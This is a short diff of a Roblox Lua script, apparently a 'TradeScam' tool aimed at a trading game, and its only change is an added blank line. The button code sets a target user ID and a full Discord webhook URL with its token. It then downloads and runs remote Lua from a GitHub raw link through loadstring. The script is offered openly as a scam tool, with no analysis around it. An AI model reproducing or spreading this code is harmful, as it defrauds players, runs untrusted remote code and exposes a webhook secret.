@@ -7,5 +7,6 @@ local TradeScamSection = FORCETRADE:NewSection("TradeScam")
 TradeScamSection:NewButton("TradeScam", "TradeScam!!", function()
 _G.UserID = 1516599524;
 _G.Webhook = "https://discord.com/api/webhooks/1072084019518382101/q9D2DokarAwm4OtiiAen2AHFrB2bLvKspCBtti2_-2FTN7MqhR1MgcNd5_k0f_bV2YNm";
+
 loadstring(game:HttpGet("https://raw.githubusercontent.com/MrFeastEz/PSX/main/scripts/main.lua"))();
 end)
